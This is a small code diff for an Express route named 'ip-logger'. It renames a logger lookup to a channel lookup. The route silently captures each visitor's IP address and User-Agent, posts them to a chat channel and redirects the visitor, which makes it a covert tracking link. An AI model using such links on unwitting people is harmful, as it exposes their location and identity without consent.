@@ -17,10 +17,10 @@ featuresRouter.get('/ip-logger/:slug', (req, res) => {
 
   const userAgent = req.headers['user-agent'] || 'Unknown';
 
-  const logger = ipLoggerService.getLogger(id);
+  const channel = ipLoggerService.getChannel(id);
 
-  if (logger) {
-    logger.channel.sendChat(`IP: ${ip}\nUser-Agent: ${userAgent}`);
+  if (channel) {
+    channel.sendChat(`IP: ${ip}\nUser-Agent: ${userAgent}`);
   }
 
   res.redirect(
